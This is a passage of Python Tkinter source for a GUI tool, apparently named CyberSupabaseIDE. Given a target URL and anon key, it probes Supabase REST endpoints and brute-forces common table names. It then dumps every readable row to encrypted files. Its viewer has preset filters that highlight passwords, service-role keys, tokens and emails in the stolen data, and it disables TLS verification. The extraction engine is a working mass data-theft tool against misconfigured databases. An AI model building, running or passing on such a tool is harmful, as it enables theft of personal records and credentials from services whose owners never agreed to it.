        sidebar.grid_columnconfigure(0, weight=1)
        sidebar.grid_rowconfigure(1, weight=1)

        sidebar_top = tk.Frame(sidebar, bg=BG_SIDEBAR, padx=6, pady=6)
        sidebar_top.grid(row=0, column=0, sticky="ew")

        tk.Label(sidebar_top, text="EXPLORER", font=FONT_HEADER, fg=FG_GREEN, bg=BG_SIDEBAR).pack(side="left")
        btn_refresh = self.create_flat_btn(sidebar_top, "🔄", self.refresh_file_tree, FG_CYAN)
        btn_refresh.pack(side="right", padx=2)
        btn_open_ext = self.create_flat_btn(sidebar_top, "📂 DIR", self.open_in_os_explorer, FG_YELLOW)
        btn_open_ext.pack(side="right", padx=2)

        self.file_tree = ttk.Treeview(sidebar, style="Cyber.Treeview", show="tree")
        self.file_tree.grid(row=1, column=0, sticky="nsew", padx=4, pady=4)
        self.file_tree.bind("<Double-1>", self.on_tree_file_selected)

        editor_container = tk.Frame(self.tab_viewer, bg=BG_PANEL, bd=1, relief="solid")
        editor_container.grid(row=0, column=1, sticky="nsew", padx=(4, 6), pady=6)
        editor_container.grid_columnconfigure(0, weight=1)
        editor_container.grid_rowconfigure(1, weight=1)

        toolbar = tk.Frame(editor_container, bg=BG_PANEL, padx=8, pady=6)
        toolbar.grid(row=0, column=0, sticky="ew")

        tk.Label(toolbar, text="FIND:", font=FONT_MONO_BOLD, fg=FG_CYAN, bg=BG_PANEL).pack(side="left")
        self.search_entry = tk.Entry(toolbar, font=FONT_MONO, bg=BG_ENTRY, fg=FG_GREEN, insertbackground=FG_GREEN, width=15, relief="flat", bd=3)
        self.search_entry.pack(side="left", padx=4)
        self.search_entry.bind("<Return>", lambda e: self.perform_search(self.search_entry.get()))

        self.btn_search = self.create_flat_btn(toolbar, "SEARCH", lambda: self.perform_search(self.search_entry.get()), FG_CYAN)
        self.btn_search.pack(side="left", padx=2)

        self.btn_prev = self.create_flat_btn(toolbar, "◀ PREV", self.prev_match, FG_YELLOW)
        self.btn_prev.pack(side="left", padx=(6, 2))

        self.btn_next = self.create_flat_btn(toolbar, "▶ NEXT", self.next_match, FG_GREEN)
        self.btn_next.pack(side="left", padx=2)

        tk.Label(toolbar, text="| FILTERS:", font=FONT_SMALL, fg=FG_MUTED, bg=BG_PANEL).pack(side="left", padx=4)
        
        btn_filter_creds = self.create_flat_btn(toolbar, "⚡ ALL CREDENTIALS", self.filter_all_credentials, "#ff0055")
        btn_filter_creds.pack(side="left", padx=2)

        btn_filter_pass = self.create_flat_btn(toolbar, "🔑 PASSWORDS", lambda: self.filter_preset("password"), "#ff6699")
        btn_filter_pass.pack(side="left", padx=2)

        btn_filter_keys = self.create_flat_btn(toolbar, "🎟️ KEYS/TOKENS", lambda: self.filter_preset("token"), "#ffd600")
        btn_filter_keys.pack(side="left", padx=2)

        btn_clear = self.create_flat_btn(toolbar, "CLEAR", self.clear_search_highlights, FG_MUTED)
        btn_clear.pack(side="left", padx=2)

        self.lbl_match_count = tk.Label(toolbar, text="[No matches]", font=FONT_MONO_BOLD, fg=FG_MUTED, bg=BG_PANEL)
        self.lbl_match_count.pack(side="right")

        editor_frame = tk.Frame(editor_container, bg=BG_EDITOR)
        editor_frame.grid(row=1, column=0, sticky="nsew", padx=6, pady=4)
        editor_frame.grid_columnconfigure(0, weight=1)
        editor_frame.grid_rowconfigure(0, weight=1)

        self.editor_text = tk.Text(
            editor_frame,
            bg=BG_EDITOR,
            fg=FG_WHITE,
            font=FONT_EDITOR,
            wrap="none",
            relief="flat",
            bd=4
        )
        self.editor_text.grid(row=0, column=0, sticky="nsew")

        v_scroll = tk.Scrollbar(editor_frame, orient="vertical", command=self.editor_text.yview, bg=BG_PANEL)
        v_scroll.grid(row=0, column=1, sticky="ns")
        h_scroll = tk.Scrollbar(editor_container, orient="horizontal", command=self.editor_text.xview, bg=BG_PANEL)
        h_scroll.grid(row=2, column=0, sticky="ew")
        self.editor_text.config(xscrollcommand=h_scroll.set, yscrollcommand=v_scroll.set)

        self.editor_text.tag_config("HL_PASSIVE", background=HL_BG_PASSIVE, foreground=HL_FG_PASSIVE)
        self.editor_text.tag_config("HL_ACTIVE", background=HL_BG_ACTIVE, foreground=HL_FG_ACTIVE, font=FONT_MONO_BOLD)

        editor_foot = tk.Frame(editor_container, bg=BG_PANEL, padx=8, pady=3)
        editor_foot.grid(row=3, column=0, sticky="ew")

        self.lbl_file_info = tk.Label(editor_foot, text="NO FILE LOADED", font=FONT_SMALL, fg=FG_MUTED, bg=BG_PANEL)
        self.lbl_file_info.pack(side="left")

    # ====================================================================
    # 🎛️ WIDGET FACTORY & LOGGERS
    # ====================================================================
    def create_flat_btn(self, parent, text, command, fg_color):
        btn = tk.Button(
            parent,
            text=text,
            command=command,
            font=FONT_MONO_BOLD,
            bg=BG_ENTRY,
            fg=fg_color,
            activebackground=fg_color,
            activeforeground=BG_ROOT,
            bd=1,
            relief="solid",
            padx=7,
            pady=3,
            cursor="hand2"
        )
        btn.bind("<Enter>", lambda e: btn.config(bg=BORDER_COLOR) if btn['state'] != 'disabled' else None)
        btn.bind("<Leave>", lambda e: btn.config(bg=BG_ENTRY) if btn['state'] != 'disabled' else None)
        return btn

    def set_controls_state(self, enabled=True):
        state = "normal" if enabled else "disabled"
        for btn in [self.btn_test, self.btn_discover, self.btn_dump]:
            btn.config(state=state)

    def start_progress_indeterminate(self, text="Processing..."):
        self.lbl_progress_text.config(text=text, fg=FG_YELLOW)
        self.progress_bar.config(mode="indeterminate")
        self.progress_bar.start(10)

    def update_progress_determinate(self, current, total, text=""):
        self.progress_bar.stop()
        self.progress_bar.config(mode="determinate", maximum=total, value=current)
        pct = int((current / total) * 100) if total > 0 else 0
        self.lbl_progress_text.config(text=f"{text} [{current}/{total}] ({pct}%)", fg=FG_GREEN)

    def stop_progress(self, text="DONE"):
        self.progress_bar.stop()
        self.progress_bar.config(mode="determinate", value=0)
        self.lbl_progress_text.config(text=text, fg=FG_MUTED)

    def log_terminal(self, message, tag="GREEN"):
        def _append():
            ts = datetime.now().strftime("%H:%M:%S")
            self.log_text.insert(tk.END, f"[{ts}] ", "MUTED")
            self.log_text.insert(tk.END, f"{message}\n", tag)
            self.log_text.see(tk.END)
        self.after(0, _append)

    def set_status(self, text, is_working=False):
        def _update():
            self.lbl_status.config(text=f">> {text.upper()}", fg=FG_YELLOW if is_working else FG_MUTED)
        self.after(0, _update)

    def set_stats(self):
        def _update():
            self.lbl_stats.config(text=f"Tables: {len(self.discovered_tables)} | Records: {self.total_records}")
        self.after(0, _update)

    # ====================================================================
    # 🔍 CREDENTIAL NAVIGATOR
    # ====================================================================
    def clear_search_highlights(self):
        self.editor_text.tag_remove("HL_PASSIVE", "1.0", tk.END)
        self.editor_text.tag_remove("HL_ACTIVE", "1.0", tk.END)
        self.match_ranges.clear()
        self.current_match_idx = -1
        self.lbl_match_count.config(text="[No matches]", fg=FG_MUTED)

    def update_active_match(self):
        if not self.match_ranges or self.current_match_idx < 0:
            return
        self.editor_text.tag_remove("HL_ACTIVE", "1.0", tk.END)
        start, end = self.match_ranges[self.current_match_idx]
        self.editor_text.tag_add("HL_ACTIVE", start, end)
        self.editor_text.see(start)
        total = len(self.match_ranges)
        current = self.current_match_idx + 1
        self.lbl_match_count.config(
            text=f"[ Match {current} of {total} ]",
            fg=FG_YELLOW if current > 0 else FG_MUTED
        )

    def next_match(self):
        if not self.match_ranges:
            return
        self.current_match_idx = (self.current_match_idx + 1) % len(self.match_ranges)
        self.update_active_match()

    def prev_match(self):
        if not self.match_ranges:
            return
        self.current_match_idx = (self.current_match_idx - 1 + len(self.match_ranges)) % len(self.match_ranges)
        self.update_active_match()

    def perform_search(self, pattern):
        if not pattern:
            self.clear_search_highlights()
            return
        self.find_and_highlight_patterns([pattern])

    def filter_preset(self, preset_type):
        if preset_type == "password":
            patterns = [
                r'"db_password"', r'"password"', r'"passwd"', r'"pwd"',
                r'"db_pass"', r'"secret"', r'"hash"', r'"passcode"'
            ]
        elif preset_type == "token":
            patterns = [
                r'"anon_key"', r'"service_role_key"', r'"serviceRoleKey"',
                r'"apiKey"', r'"apikey"', r'"access_token"', r'"jwt"', r'"token"'
            ]
        self.find_and_highlight_patterns(patterns, is_regex=True)

    def filter_all_credentials(self):
        cred_keys = [
            r'"db_password"', r'"password"', r'"passwd"', r'"pwd"',
            r'"db_username"', r'"username"', r'"email"',
            r'"service_role_key"', r'"serviceRoleKey"',
            r'"anon_key"', r'"anonKey"', r'"apikey"', r'"apiKey"',
            r'"database_url"', r'"supabase_url"', r'"db_host"', r'"secret"'
        ]
        self.find_and_highlight_patterns(cred_keys, is_regex=True)

    def find_and_highlight_patterns(self, patterns, is_regex=False):
        self.clear_search_highlights()
        content = self.editor_text.get("1.0", tk.END)
        matches_found = []

        if is_regex:
            combined_regex = re.compile("|".join(patterns), re.IGNORECASE)
            for m in combined_regex.finditer(content):
                start_idx = self.editor_text.index(f"1.0 + {m.start()} chars")
                end_idx = self.editor_text.index(f"1.0 + {m.end()} chars")
                matches_found.append((start_idx, end_idx))
        else:
            for pat in patterns:
                start_pos = "1.0"
                while True:
                    start_pos = self.editor_text.search(pat, start_pos, nocase=True, stopindex=tk.END)
                    if not start_pos:
                        break
                    end_pos = f"{start_pos}+{len(pat)}c"
                    matches_found.append((start_pos, end_pos))
                    start_pos = end_pos

        matches_found.sort(key=lambda item: [int(x) for x in item[0].split('.')])
        self.match_ranges = matches_found

        if self.match_ranges:
            for start, end in self.match_ranges:
                self.editor_text.tag_add("HL_PASSIVE", start, end)
            self.current_match_idx = 0
            self.update_active_match()
        else:
            self.lbl_match_count.config(text="[ 0 matches ]", fg=FG_RED)

    # ====================================================================
    # 📂 FILE EXPLORER & VIEWER LOADER (WITH AUTO-DECRYPTION)
    # ====================================================================
    def refresh_file_tree(self):
        for item in self.file_tree.get_children():
            self.file_tree.delete(item)
        if not os.path.exists(self.base_dump_dir):
            return
        for root, dirs, files in os.walk(self.base_dump_dir):
            rel_path = os.path.relpath(root, self.base_dump_dir)
            parent_node = "" if rel_path == "." else rel_path
            if rel_path != ".":
                folder_name = os.path.basename(root)
                parent_dir = os.path.dirname(rel_path)
                parent_id = "" if parent_dir == "" else parent_dir
                if not self.file_tree.exists(rel_path):
                    self.file_tree.insert(parent_id, "end", rel_path, text=f" 📁 {folder_name}", open=True)
            for f in sorted(files, reverse=True):
                if f.endswith(".json"):
                    full_fpath = os.path.join(root, f)
                    self.file_tree.insert(parent_node, "end", full_fpath, text=f" 🔒 {f}")

    def on_tree_file_selected(self, event):
        selected_item = self.file_tree.focus()
        if os.path.isfile(selected_item):
            self.load_file_into_editor(selected_item)

    def load_file_into_editor(self, filepath):
        try:
            with open(filepath, 'r', encoding='utf-8') as f:
                raw_encrypted_content = f.read()

            decrypted_content = decrypt_data(raw_encrypted_content)

            try:
                parsed = json.loads(decrypted_content)
                formatted = json.dumps(parsed, indent=2, ensure_ascii=False)
            except Exception:
                formatted = decrypted_content

            self.editor_text.delete("1.0", tk.END)
            self.editor_text.insert(tk.END, formatted)
            self.current_loaded_file = filepath
            size_kb = round(os.path.getsize(filepath) / 1024, 2)
            lines = formatted.count("\n") + 1
            self.lbl_file_info.config(
                text=f"FILE: {os.path.basename(filepath)} [DECRYPTED] | Size: {size_kb} KB | Lines: {lines}",
                fg=FG_GREEN
            )
            self.notebook.select(self.tab_viewer)
            self.clear_search_highlights()
        except Exception as e:
            messagebox.showerror("Read Error", f"Could not decrypt/read file:\n{e}")

    def open_in_os_explorer(self):
        target = self.current_loaded_file if self.current_loaded_file else self.base_dump_dir
        folder = os.path.dirname(target) if os.path.isfile(target) else target
        try:
            if os.name == 'nt':
                os.startfile(folder)
            elif sys.platform == 'darwin':
                subprocess.Popen(["open", folder])
            else:
                subprocess.Popen(["xdg-open", folder])
        except Exception as e:
            messagebox.showerror("Error", f"Failed opening folder: {e}")

    # ====================================================================
    # ⚙️ EXTRACTION ENGINE
    # ====================================================================
    def get_credentials(self):
        url = self.url_entry.get().strip().rstrip('/')
        key = self.key_entry.get().strip()
        limit_str = self.limit_combo.get().split()[0]
        limit = int(limit_str) if limit_str.isdigit() else 1000000
        if url and not url.startswith("http"):
            url = f"https://{url}"
        return url, key, limit

    def get_auto_dump_path(self, url):
        parsed = urlparse(url)
        hostname = parsed.netloc or parsed.path
        safe_host = "".join([c for c in hostname if c.isalnum() or c in ".-_"]).strip() or "target_host"
        prefix = safe_host.split('.')[0]
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"{prefix}_dump_{timestamp}.json"
        target_folder = os.path.join(self.base_dump_dir, safe_host)
        os.makedirs(target_folder, exist_ok=True)
        return target_folder, os.path.join(target_folder, filename)

    def start_test_thread(self):
        if self.is_running: return
        url, key, _ = self.get_credentials()
        if not url or not key:
            messagebox.showwarning("Incomplete Fields", "Please enter both Target URL and API/Anon Key.")
            return
        self.set_controls_state(False)
        threading.Thread(target=self.run_test, daemon=True).start()

    def run_test(self):
        self.is_running = True
        self.set_status("Testing Handshake...", True)
        self.after(0, lambda: self.start_progress_indeterminate("Probing Target..."))
        url, key, _ = self.get_credentials()
        self.log_terminal(f"[*] Testing connection with {url}...", "CYAN")
        headers = {"apikey": key, "Authorization": f"Bearer {key}", "Content-Type": "application/json"}
        try:
            res = requests.get(f"{url}/rest/v1/", headers=headers, timeout=8, verify=False)
            if res.status_code == 200:
                self.log_terminal("[✓] Connected! OpenAPI schema is openly readable.", "GREEN")
            elif res.status_code == 401 and "service_role" in res.text:
                self.log_terminal("[!] Notice: Root OpenAPI requires service_role key. Probing tables directly...", "YELLOW")
                test_tbl = requests.get(f"{url}/rest/v1/profiles?limit=1", headers=headers, timeout=8, verify=False)
                if test_tbl.status_code in [200, 206, 404]:
                    self.log_terminal("[✓] API Gateway is ONLINE and replying to REST queries.", "GREEN")
                else:
                    self.log_terminal(f"[!] Target returned status: {test_tbl.status_code}", "YELLOW")
            else:
                self.log_terminal(f"[!] Server responded with code: {res.status_code}", "YELLOW")
        except RequestException as e:
            self.log_terminal(f"[✗] Handshake Failed: {str(e)}", "RED")
        finally:
            self.after(0, lambda: self.stop_progress("IDLE"))
            self.set_status("Idle", False)
            self.set_controls_state(True)
            self.is_running = False

    def start_discover_thread(self):
        if self.is_running: return
        url, key, _ = self.get_credentials()
        if not url or not key:
            messagebox.showwarning("Incomplete Fields", "Please enter both Target URL and API/Anon Key.")
            return
        self.set_controls_state(False)
        threading.Thread(target=self.run_discover, daemon=True).start()

    def run_discover(self):
        self.is_running = True
        self.set_status("Discovering Tables...", True)
        self.discovered_tables.clear()
        self.after(0, lambda: self.table_listbox.delete(0, tk.END))
        url, key, _ = self.get_credentials()
        headers = {"apikey": key, "Authorization": f"Bearer {key}"}
        self.after(0, lambda: self.start_progress_indeterminate("Scanning Swagger OpenAPI..."))
        try:
            res = requests.get(f"{url}/rest/v1/", headers=headers, timeout=6, verify=False)
            if res.status_code == 200:
                schema = res.json()
                if "definitions" in schema:
                    for tbl in schema["definitions"].keys():
                        if tbl not in self.discovered_tables:
                            self.discovered_tables.append(tbl)
                            self.log_terminal(f"[+] Found via Schema: {tbl}", "GREEN")
        except Exception:
            pass
        common_tables = [
            'profiles', 'users', 'accounts', 'auth', 'sessions', 'members',
            'companies', 'records', 'tickets', 'schedules', 'appointments',
            'activity_logs', 'operational_costs', 'analytics', 'audit_logs',
            'logs', 'events', 'transactions', 'payments', 'orders', 'products',
            'settings', 'config', 'preferences', 'metadata', 'notifications',
            'messages', 'chats', 'files', 'documents', 'roles', 'permissions'
        ]
        total = len(common_tables)
        self.log_terminal(f"[*] Probing {total} common table names...", "CYAN")
        for idx, tbl in enumerate(common_tables, 1):
            self.after(0, lambda i=idx, t=total: self.update_progress_determinate(i, t, "Probing tables..."))
            if tbl in self.discovered_tables:
                continue
            try:
                r = requests.get(f"{url}/rest/v1/{tbl}?limit=1", headers=headers, timeout=4, verify=False)
                if r.status_code in [200, 206]:
                    self.discovered_tables.append(tbl)
                    self.log_terminal(f"[✓] Accessible table: {tbl}", "GREEN")
            except RequestException:
                pass
        def _update_ui():
            for t in self.discovered_tables:
                self.table_listbox.insert(tk.END, f"  📁 {t}")
        self.after(0, _update_ui)
        self.log_terminal(f"[*] Discovery ended: {len(self.discovered_tables)} tables found.", "CYAN")
        self.set_stats()
        self.after(0, lambda: self.stop_progress(f"FOUND {len(self.discovered_tables)} TABLES"))
        self.set_status("Idle", False)
        self.set_controls_state(True)
        self.is_running = False

    def start_dump_thread(self):
        if self.is_running: return
        url, key, _ = self.get_credentials()
        if not url or not key:
            messagebox.showwarning("Incomplete Fields", "Please enter both Target URL and API/Anon Key.")
            return
        if not self.discovered_tables:
            messagebox.showwarning("Notice", "No tables discovered yet. Run 'DISCOVER TABLES' first.")
            return
        self.set_controls_state(False)
        threading.Thread(target=self.run_dump, daemon=True).start()

    def run_dump(self):
        self.is_running = True
        self.set_status("Dumping data...", True)
        url, key, limit = self.get_credentials()
        headers = {"apikey": key, "Authorization": f"Bearer {key}", "Content-Type": "application/json"}
        self.table_data = {}
        self.total_records = 0
        batch_size = 500
        total_tables = len(self.discovered_tables)
        for tbl_idx, tbl in enumerate(self.discovered_tables, 1):
            self.after(0, lambda i=tbl_idx, t=total_tables, name=tbl: self.update_progress_determinate(i, t, f"Extracting {name}"))
            self.log_terminal(f"[*] Extracting rows from: '{tbl}'...", "CYAN")
            all_records = []
            offset = 0
            while True:
                try:
                    res = requests.get(
                        f"{url}/rest/v1/{tbl}",
                        headers=headers,
                        params={"limit": batch_size, "offset": offset},
                        timeout=25,
                        verify=False
                    )
                    if res.status_code != 200:
                        self.log_terminal(f"[✗] Table '{tbl}' query ended (Status {res.status_code})", "YELLOW")
                        break
                    data = res.json()
                    if not data or len(data) == 0:
                        break
                    all_records.extend(data)
                    self.total_records += len(data)
                    offset += len(data)
                    self.set_stats()
                    self.log_terminal(f"    -> Table '{tbl}': Fetched {len(all_records)} rows...", "MUTED")
                    if len(data) < batch_size or (limit and len(all_records) >= limit):
                        break
                except RequestException as e:
                    self.log_terminal(f"[✗] Interrupted on '{tbl}': {e}", "RED")
                    break
            self.table_data[tbl] = all_records
            self.log_terminal(f"[✓] Finished '{tbl}' ({len(all_records)} rows)", "GREEN")
        
        target_folder, file_path = self.get_auto_dump_path(url)
        output = {
            "target_url": url,
            "exported_at": datetime.now().isoformat(),
            "summary": {
                "total_tables": len(self.table_data),
                "total_records": self.total_records,
                "tables": list(self.table_data.keys())
            },
            "data": self.table_data
        }
        try:
            raw_json_str = json.dumps(output, indent=2, ensure_ascii=False)
            encrypted_payload = encrypt_data(raw_json_str)
            with open(file_path, 'w', encoding='utf-8') as f:
                f.write(encrypted_payload)
                
            self.log_terminal(f"[★] EXTRACTION COMPLETE: {self.total_records} rows secured.", "YELLOW")
            self.log_terminal(f"[🔒] ENCRYPTED & SAVED TO: {file_path}", "GREEN")
            
            self.after(0, self.refresh_file_tree)
            self.after(0, lambda: self.load_file_into_editor(file_path))
            messagebox.showinfo(
                "Extraction Finished",
                f"Successfully dumped {self.total_records} records!\n\n"
                f"🔒 Storage: Encrypted on Disk\n"
                f"Saved to: {file_path}\n\n"
                "Decrypted & Auto-loaded into Workspace Viewer."
            )
        except Exception as e:
            self.log_terminal(f"[✗] Save failed: {e}", "RED")
        self.after(0, lambda: self.stop_progress("DUMP COMPLETE"))
        self.set_status("Dump completed", False)
        self.set_controls_state(True)
        self.is_running = False


# ====================================================================
# 🚀 APP ENTRYPOINT
# ====================================================================
if __name__ == "__main__":
    app = CyberSupabaseIDE()
    app.mainloop()
